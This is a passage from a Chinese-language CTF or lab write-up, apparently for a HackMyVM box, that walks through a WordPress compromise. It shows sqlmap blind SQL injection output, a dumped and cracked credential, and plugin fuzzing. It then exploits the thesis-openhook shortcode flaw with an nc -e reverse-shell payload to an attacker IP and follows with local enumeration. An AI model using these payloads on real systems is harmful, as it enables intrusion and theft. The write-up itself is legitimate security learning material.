<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> using <span class="token string">'/root/.local/share/sqlmap/output/results-04212024_1129am.csv'</span> as the CSV results <span class="token function">file</span> <span class="token keyword">in</span> multiple targets mode
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: username <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND (SELECT 7400 FROM (SELECT(SLEEP(5)))mKnG) AND '</span>CLyv<span class="token string">'='</span>CLyv<span class="token operator">&amp;</span><span class="token assign-left variable">wish</span><span class="token operator">=</span><span class="token number">123456</span>
---
<span class="token keyword">do</span> you want to exploit this SQL injection? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache <span class="token number">2.4</span>.57
back-end DBMS: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 <span class="token punctuation">(</span>MariaDB fork<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching number of databases
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: <span class="token number">2</span>
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: information_schema
<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: wish_db
available databases <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> wish_db

<span class="token punctuation">[</span><span class="token number">11</span>:29:37<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> you can <span class="token function">find</span> results of scanning <span class="token keyword">in</span> multiple targets mode inside the CSV <span class="token function">file</span> <span class="token string">'/root/.local/share/sqlmap/output/results-04212024_1129am.csv'</span>                                                                                                                            

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">11</span>:29:37 /2024-04-21/
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>最后爆破出来一组账号密码</p>
<blockquote>
<p>+—-+———————————-+———-+<br>| id | password                         | username |<br>+—-+———————————-+———-+<br>| 1  | 8df4387dd1598d4dcf237f9443028cec | umeko    |<br>+—-+———————————-+———-+</p>
</blockquote>
<p>md5碰撞一下<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkljX.png" alt="OpkljX.png" loading="lazy"></p>
<p><code>umeko/fuckit!</code></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="https://ooo.0x0.ooo/2024/04/21/OpkjWt.png" alt="OpkjWt.png" loading="lazy"><br>成功登录</p>
<p>一般wp大概率是插件漏洞，先扫一下插件<br>fuzz一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -c -w wpplugins.txt -u 'http://tiny.hmv/wp-content/plugins/FUZZ'       </span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://tiny.hmv/wp-content/plugins/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /root/Desktop/wpplugins.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

akismet                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">325</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 8ms<span class="token punctuation">]</span>
thesis-openhook         <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">333</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 9ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">51545</span>/51545<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">4081</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:12<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>
<p>有两个插件 akismet和thesis-openhook<br>akismet有个cve <code>CVE-2015-9357</code> thesis-openhook有个cve <code>CVE-2023-5201</code><br>由于该版本wp较新 我使用thesis-openhook 的CVE<br><img src="https://ooo.0x0.ooo/2024/04/21/Opk2gx.png" alt="Opk2gx.png" loading="lazy"><br>只要在文章插入php短代码即可<br><img src="https://ooo.0x0.ooo/2024/04/21/Opk6sj.png" alt="Opk6sj.png" loading="lazy"><br>发现成功执行<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkXop.png" alt="OpkXop.png" loading="lazy"><br>然后弹个shell</p>
<blockquote>
<p>[php]<br><?php system('nc -e /bin/bash 192.168.56.104 4567');?><br>[&#x2F;php]</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567              </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.157<span class="token punctuation">]</span> <span class="token number">60574</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>升级一下shell<br><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><p>端口扫描的时候出现的8888端口还没利用，看一下网络情况和进程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ ss <span class="token parameter variable">-tulnp</span>
ss <span class="token parameter variable">-tulnp</span>
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN <span class="token number">0</span>      <span class="token number">0</span>            <span class="token number">0.0</span>.0.0:68        <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">511</span>        <span class="token number">127.0</span>.0.1:8000      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">80</span>         <span class="token number">127.0</span>.0.1:3306      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">128</span>          <span class="token number">0.0</span>.0.0:22        <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">1024</span>         <span class="token number">0.0</span>.0.0:8888      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">511</span>                *:80              *:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">128</span>             <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">1024</span>            <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:8888         <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*  </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">ps</span> aux
<span class="token function">ps</span> aux
<span class="token environment constant">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           <span class="token number">1</span>  <span class="token number">0.0</span>  <span class="token number">0.4</span> <span class="token number">101960</span> <span class="token number">12068</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:01 /sbin/init
root           <span class="token number">2</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>
root           <span class="token number">3</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_gp<span class="token punctuation">]</span>
root           <span class="token number">4</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_par_gp<span class="token punctuation">]</span>
root           <span class="token number">5</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>slub_flushwq
root           <span class="token number">6</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>netns<span class="token punctuation">]</span>
root           <span class="token number">8</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:0H
root          <span class="token number">10</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>mm_percpu_wq
root          <span class="token number">11</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_kt
root          <span class="token number">12</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_ru
root          <span class="token number">13</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_tr
root          <span class="token number">14</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:08 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>
root          <span class="token number">15</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_preempt<span class="token punctuation">]</span>
root          <span class="token number">16</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>migration/0<span class="token punctuation">]</span>
root          <span class="token number">18</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>cpuhp/0<span class="token punctuation">]</span>
root          <span class="token number">20</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kdevtmpfs<span class="token punctuation">]</span>
root          <span class="token number">21</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>inet_frag_wq
root          <span class="token number">22</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kauditd<span class="token punctuation">]</span>
root          <span class="token number">23</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>khungtaskd<span class="token punctuation">]</span>
root          <span class="token number">25</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>oom_reaper<span class="token punctuation">]</span>
root          <span class="token number">26</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>writeback<span class="token punctuation">]</span>
root          <span class="token number">28</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kcompactd0<span class="token punctuation">]</span>
root          <span class="token number">29</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        SN   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ksmd<span class="token punctuation">]</span>
root          <span class="token number">30</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        SN   <span class="token number">17</span>:06   <span class="token number">0</span>:01 <span class="token punctuation">[</span>khugepaged<span class="token punctuation">]</span>
root          <span class="token number">31</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kintegrityd<span class="token punctuation">]</span>
root          <span class="token number">32</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kblockd<span class="token punctuation">]</span>
root          <span class="token number">33</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>blkcg_punt_b
root          <span class="token number">34</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>tpm_dev_wq<span class="token punctuation">]</span>
root          <span class="token number">35</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>edac-poller<span class="token punctuation">]</span>
root          <span class="token number">36</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>devfreq_wq<span class="token punctuation">]</span>
root          <span class="token number">38</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kswapd0<span class="token punctuation">]</span>
root          <span class="token number">44</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kthrotld<span class="token punctuation">]</span>
root          <span class="token number">46</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>acpi_thermal
root          <span class="token number">47</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>xenbus_probe
root          <span class="token number">48</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>mld<span class="token punctuation">]</span>
root          <span class="token number">49</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ipv6_addrcon
root          <span class="token number">54</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kstrp<span class="token punctuation">]</span>
root          <span class="token number">59</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>zswap-shrink
root          <span class="token number">60</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u3:0
root         <span class="token number">128</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ata_sff<span class="token punctuation">]</span>
root         <span class="token number">129</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_0<span class="token punctuation">]</span>
root         <span class="token number">130</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_0<span class="token punctuation">]</span>
root         <span class="token number">131</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_1<span class="token punctuation">]</span>
root         <span class="token number">132</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_1<span class="token punctuation">]</span>
root         <span class="token number">133</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_2<span class="token punctuation">]</span>
root         <span class="token number">134</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_2<span class="token punctuation">]</span>
root         <span class="token number">142</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:01 <span class="token punctuation">[</span>kworker/0:2H
root         <span class="token number">173</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>jbd2/sda1-8<span class="token punctuation">]</span>
root         <span class="token number">174</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ext4-rsv-con
root         <span class="token number">219</span>  <span class="token number">0.0</span>  <span class="token number">0.4</span>  <span class="token number">33036</span> <span class="token number">12480</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">245</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">25464</span>  <span class="token number">6200</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
systemd+     <span class="token number">252</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">90040</span>  <span class="token number">6636</span> ?        Ssl  <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">304</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>cryptd<span class="token punctuation">]</span>
root         <span class="token number">337</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>irq/18-vmwgf
root         <span class="token number">402</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">5868</span>  <span class="token number">3696</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 dhclient <span class="token parameter variable">-4</span> -
root         <span class="token number">493</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">6608</span>  <span class="token number">2696</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/sbin/cro
message+     <span class="token number">494</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">9116</span>  <span class="token number">4828</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/bin/dbus
root         <span class="token number">496</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">24836</span>  <span class="token number">7764</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">513</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">16508</span>  <span class="token number">5844</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /sbin/wpa_sup
tinypro+     <span class="token number">520</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span> <span class="token number">531124</span>  <span class="token number">3996</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/bin/tiny
root         <span class="token number">525</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">5872</span>  <span class="token number">1032</span> tty1     Ss+  <span class="token number">17</span>:06   <span class="token number">0</span>:00 /sbin/agetty 
root         <span class="token number">544</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>  <span class="token number">10344</span>   <span class="token number">976</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 nginx: master
root         <span class="token number">546</span>  <span class="token number">0.0</span>  <span class="token number">0.3</span>  <span class="token number">15400</span>  <span class="token number">9300</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 sshd: /usr/sb
root         <span class="token number">547</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>  <span class="token number">11940</span>  <span class="token number">3780</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 nginx: worker
root         <span class="token number">591</span>  <span class="token number">0.0</span>  <span class="token number">1.0</span> <span class="token number">253640</span> <span class="token number">28636</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:01 /usr/sbin/apa
mysql        <span class="token number">603</span>  <span class="token number">0.0</span>  <span class="token number">8.8</span> <span class="token number">1081328</span> <span class="token number">247912</span> ?      Ssl  <span class="token number">17</span>:06   <span class="token number">0</span>:05 /usr/sbin/mar
www-data    <span class="token number">2041</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257320</span> <span class="token number">43384</span> ?        S    <span class="token number">18</span>:41   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2057</span>  <span class="token number">0.0</span>  <span class="token number">1.7</span> <span class="token number">257820</span> <span class="token number">49616</span> ?        S    <span class="token number">18</span>:41   <span class="token number">0</span>:02 /usr/sbin/apa
www-data    <span class="token number">2081</span>  <span class="token number">0.0</span>  <span class="token number">1.7</span> <span class="token number">257916</span> <span class="token number">49096</span> ?        S    <span class="token number">18</span>:42   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2115</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257268</span> <span class="token number">43316</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2128</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257164</span> <span class="token number">44580</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2131</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257200</span> <span class="token number">45016</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
